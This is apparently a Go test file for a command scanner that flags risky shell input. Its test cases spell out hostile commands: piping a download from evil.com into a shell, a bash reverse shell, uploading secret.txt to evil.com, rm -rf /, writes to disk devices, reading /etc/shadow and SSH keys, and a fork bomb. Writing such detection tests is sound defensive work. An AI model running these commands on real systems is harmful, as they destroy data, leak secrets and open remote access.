package scanners

import (
	"testing"
)

func TestCommandScanner_Name(t *testing.T) {
	s := NewCommandScanner()
	if s.Name() != "commands" {
		t.Errorf("Name() = %v, want commands", s.Name())
	}
}

func TestCommandScanner_RemoteCodeExecution(t *testing.T) {
	s := NewCommandScanner()

	tests := []struct {
		name     string
		input    string
		wantHit  bool
		category string
	}{
		{
			name:     "curl pipe to sh",
			input:    "curl http://example.com/script.sh | sh",
			wantHit:  true,
			category: "remote_code_execution",
		},
		{
			name:     "wget pipe to bash",
			input:    "wget -O- http://example.com/install.sh | bash",
			wantHit:  true,
			category: "remote_code_execution",
		},
		{
			name:     "curl pipe to /bin/sh",
			input:    "curl http://evil.com | /bin/sh",
			wantHit:  true,
			category: "remote_code_execution",
		},
		{
			name:     "eval with curl",
			input:    "eval \"$(curl http://example.com/script)\"",
			wantHit:  true,
			category: "remote_code_execution",
		},
		{
			name:     "curl to file (safe)",
			input:    "curl http://example.com/file.tar.gz -o file.tar.gz",
			wantHit:  false,
			category: "remote_code_execution",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := s.Scan(tt.input)
			found := false
			for _, f := range findings {
				if f.Category == tt.category {
					found = true
					break
				}
			}
			if found != tt.wantHit {
				t.Errorf("Scan() found = %v, want %v for category %s", found, tt.wantHit, tt.category)
			}
		})
	}
}

func TestCommandScanner_DestructiveOperations(t *testing.T) {
	s := NewCommandScanner()

	tests := []struct {
		name     string
		input    string
		wantHit  bool
		severity string
	}{
		{
			name:     "rm -rf /",
			input:    "rm -rf /",
			wantHit:  true,
			severity: "critical",
		},
		{
			name:     "rm -rf ~",
			input:    "rm -rf ~",
			wantHit:  true,
			severity: "critical",
		},
		{
			name:     "rm -rf $HOME",
			input:    "rm -rf $HOME",
			wantHit:  true,
			severity: "critical",
		},
		{
			name:     "rm -rf /usr",
			input:    "rm -rf /usr",
			wantHit:  true,
			severity: "critical",
		},
		{
			name:     "rm -rf ./node_modules (relative path)",
			input:    "rm -rf ./node_modules",
			wantHit:  true, // Matches rm_recursive but not rm_rf_root
			severity: "medium",
		},
		{
			name:     "find -delete",
			input:    "find /tmp -name '*.tmp' -delete",
			wantHit:  true,
			severity: "high",
		},
		{
			name:     "find -exec rm",
			input:    "find . -name '*.log' -exec rm {} \\;",
			wantHit:  true,
			severity: "high",
		},
		{
			name:     "shred",
			input:    "shred -u sensitive_file.txt",
			wantHit:  true,
			severity: "high",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := s.Scan(tt.input)
			found := false
			for _, f := range findings {
				if f.Category == "destructive" {
					found = true
					break
				}
			}
			if found != tt.wantHit {
				t.Errorf("Scan() found = %v, want %v", found, tt.wantHit)
			}
		})
	}
}

func TestCommandScanner_DiskOperations(t *testing.T) {
	s := NewCommandScanner()

	tests := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "dd to disk",
			input:   "dd if=image.iso of=/dev/sda bs=4M",
			wantHit: true,
		},
		{
			name:    "dd from /dev/zero",
			input:   "dd if=/dev/zero of=file bs=1M count=100",
			wantHit: false, // Only "high" severity, not "critical" - not writing to device
		},
		{
			name:    "mkfs.ext4",
			input:   "mkfs.ext4 /dev/sdb1",
			wantHit: true,
		},
		{
			name:    "fdisk",
			input:   "fdisk /dev/sda",
			wantHit: true,
		},
		{
			name:    "dd to file (relatively safe)",
			input:   "dd if=input.bin of=output.bin",
			wantHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := s.Scan(tt.input)
			found := false
			for _, f := range findings {
				if f.Category == "destructive" && f.Severity == "critical" {
					found = true
					break
				}
			}
			if found != tt.wantHit {
				t.Errorf("Scan() found = %v, want %v", found, tt.wantHit)
			}
		})
	}
}

func TestCommandScanner_PrivilegeEscalation(t *testing.T) {
	s := NewCommandScanner()

	tests := []struct {
		name    string
		input   string
		wantHit bool
		pattern string
	}{
		{
			name:    "sudo",
			input:   "sudo apt install vim",
			wantHit: true,
			pattern: "sudo",
		},
		{
			name:    "su root",
			input:   "su - root",
			wantHit: true,
			pattern: "su_root",
		},
		{
			name:    "chmod 777",
			input:   "chmod 777 script.sh",
			wantHit: true,
			pattern: "chmod_777",
		},
		{
			name:    "chmod +x (safe)",
			input:   "chmod +x script.sh",
			wantHit: false,
			pattern: "chmod_777",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := s.Scan(tt.input)
			found := false
			for _, f := range findings {
				if f.Type == tt.pattern || (tt.pattern == "" && f.Category == "privileged") {
					found = true
					break
				}
			}
			if found != tt.wantHit {
				t.Errorf("Scan() found = %v, want %v", found, tt.wantHit)
			}
		})
	}
}

func TestCommandScanner_NetworkOperations(t *testing.T) {
	s := NewCommandScanner()

	tests := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "netcat listener",
			input:   "nc -lvp 4444",
			wantHit: true,
		},
		{
			name:    "reverse shell",
			input:   "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			wantHit: true,
		},
		{
			name:    "curl upload",
			input:   "curl -F 'file=@secret.txt' http://evil.com/upload",
			wantHit: true,
		},
		{
			name:    "curl download (less risky)",
			input:   "curl http://example.com/file.txt -o file.txt",
			wantHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := s.Scan(tt.input)
			found := false
			for _, f := range findings {
				if f.Category == "network" {
					found = true
					break
				}
			}
			if found != tt.wantHit {
				t.Errorf("Scan() found = %v, want %v", found, tt.wantHit)
			}
		})
	}
}

func TestCommandScanner_SensitiveFileAccess(t *testing.T) {
	s := NewCommandScanner()

	tests := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "cat /etc/shadow",
			input:   "cat /etc/shadow",
			wantHit: true,
		},
		{
			name:    "cat /etc/passwd",
			input:   "cat /etc/passwd",
			wantHit: true,
		},
		{
			name:    "cat SSH private key",
			input:   "cat ~/.ssh/id_rsa",
			wantHit: true,
		},
		{
			name:    "cat .env file",
			input:   "cat .env",
			wantHit: true,
		},
		{
			name:    "source .env",
			input:   "source .env",
			wantHit: true,
		},
		{
			name:    "cat normal file",
			input:   "cat README.md",
			wantHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := s.Scan(tt.input)
			found := false
			for _, f := range findings {
				if f.Category == "sensitive_access" {
					found = true
					break
				}
			}
			if found != tt.wantHit {
				t.Errorf("Scan() found = %v, want %v", found, tt.wantHit)
			}
		})
	}
}

func TestCommandScanner_PackageInstallation(t *testing.T) {
	s := NewCommandScanner()

	tests := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "npm install global",
			input:   "npm install -g typescript",
			wantHit: true,
		},
		{
			name:    "pip install",
			input:   "pip install requests",
			wantHit: true,
		},
		{
			name:    "apt install",
			input:   "apt install nginx",
			wantHit: true,
		},
		{
			name:    "brew install",
			input:   "brew install wget",
			wantHit: true,
		},
		{
			name:    "npm test (not install)",
			input:   "npm test",
			wantHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := s.Scan(tt.input)
			found := false
			for _, f := range findings {
				if f.Category == "install" {
					found = true
					break
				}
			}
			if found != tt.wantHit {
				t.Errorf("Scan() found = %v, want %v", found, tt.wantHit)
			}
		})
	}
}

func TestCommandScanner_Obfuscation(t *testing.T) {
	s := NewCommandScanner()

	tests := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "base64 decode to shell",
			input:   "echo 'cm0gLXJmIC8=' | base64 -d | sh",
			wantHit: true,
		},
		{
			name:    "eval with variable",
			input:   "eval \"$CMD\"",
			wantHit: true,
		},
		{
			name:    "base64 decode only",
			input:   "echo 'SGVsbG8=' | base64 -d",
			wantHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := s.Scan(tt.input)
			found := false
			for _, f := range findings {
				if f.Category == "obfuscation" {
					found = true
					break
				}
			}
			if found != tt.wantHit {
				t.Errorf("Scan() found = %v, want %v", found, tt.wantHit)
			}
		})
	}
}

func TestCommandScanner_ForkBomb(t *testing.T) {
	s := NewCommandScanner()

	tests := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{
			name:    "classic fork bomb",
			input:   ":(){ :|:& };:",
			wantHit: true,
		},
		{
			name:    "while true fork",
			input:   "while true; do sleep 1 & done",
			wantHit: true,
		},
		{
			name:    "while true no fork",
			input:   "while true; do echo hello; done",
			wantHit: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := s.Scan(tt.input)
			found := false
			for _, f := range findings {
				if f.Category == "dos" {
					found = true
					break
				}
			}
			if found != tt.wantHit {
				t.Errorf("Scan() found = %v, want %v", found, tt.wantHit)
			}
		})
	}
}

func TestCommandScanner_AnalyzeCommand(t *testing.T) {
	s := NewCommandScanner()

	tests := []struct {
		name           string
		input          string
		wantRiskLevel  string
		wantPipe       bool
		wantBackground bool
	}{
		{
			name:          "dangerous command",
			input:         "curl http://evil.com | sh",
			wantRiskLevel: "critical",
			wantPipe:      true,
		},
		{
			name:          "medium risk",
			input:         "rm -r ./temp",
			wantRiskLevel: "medium",
			wantPipe:      false,
		},
		{
			name:           "background process",
			input:          "sleep 100 &",
			wantRiskLevel:  "low",
			wantBackground: true,
		},
		{
			name:          "safe command",
			input:         "ls -la",
			wantRiskLevel: "low",
			wantPipe:      false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			info := s.AnalyzeCommand(tt.input)
			if info.RiskLevel != tt.wantRiskLevel {
				t.Errorf("RiskLevel = %v, want %v", info.RiskLevel, tt.wantRiskLevel)
			}
			if info.HasPipe != tt.wantPipe {
				t.Errorf("HasPipe = %v, want %v", info.HasPipe, tt.wantPipe)
			}
			if info.HasBackground != tt.wantBackground {
				t.Errorf("HasBackground = %v, want %v", info.HasBackground, tt.wantBackground)
			}
		})
	}
}

func TestCommandScanner_SafeCommands(t *testing.T) {
	s := NewCommandScanner()

	// These commands should NOT trigger any findings
	safeCommands := []string{
		"ls -la",
		"pwd",
		"echo hello",
		"git status",
		"npm test",
		"go build",
		"cat README.md",
		"grep pattern file.txt",
		"mkdir new_dir",
		"touch file.txt",
	}

	for _, cmd := range safeCommands {
		t.Run(cmd, func(t *testing.T) {
			findings := s.Scan(cmd)
			// Filter to high-severity findings only
			critical := 0
			for _, f := range findings {
				if f.Severity == "critical" || f.Severity == "high" {
					critical++
				}
			}
			if critical > 0 {
				t.Errorf("Safe command %q triggered %d critical/high findings: %v", cmd, critical, findings)
			}
		})
	}
}
